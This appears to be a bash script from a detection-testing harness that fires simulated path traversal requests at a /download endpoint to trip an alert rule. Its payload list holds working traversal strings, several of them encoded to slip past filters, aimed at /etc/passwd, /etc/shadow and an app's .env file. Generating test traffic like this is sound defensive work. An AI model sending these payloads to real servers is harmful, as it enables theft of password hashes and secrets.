#!/usr/bin/env bash
# Attack (rule 100150): path traversal / local file inclusion — walking out of the web root to read
# sensitive files. A real run tries several encodings and targets, not one poke. The traversal
# patterns are unambiguous (high confidence); every request trips rule 100150 and ignore=60 collapses
# the burst into one case. The endpoint, target files, depth and encoding all vary per run.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
ip="$(rand_attacker_ip)"
ua="$(pick 'curl/8.5.0' 'python-requests/2.31' 'Wfuzz/3.1' 'Go-http-client/1.1' 'Mozilla/5.0')"
ep="/download"
payloads=(
  '../../../../etc/passwd'
  '../../../../../../etc/passwd'
  '../../../../../etc/shadow'
  '..%2f..%2f..%2f..%2fetc%2fpasswd'
  '....//....//....//etc/passwd'
  '..%5c..%5c..%5cwindows%5cwin.ini'
  '../../../app/app.py'
  '../../../app/.env'
  '/etc/passwd%00.png'
  '..%252f..%252f..%252fetc%252fpasswd'
)
n="$(rint 6 10)"
echo "path traversal from ${ip} (${n} attempts against ${ep})"
for ((i=1; i<=n; i++)); do
  hit GET "${ep}?file=$(pick "${payloads[@]}")" "$ip" "$ua"
done
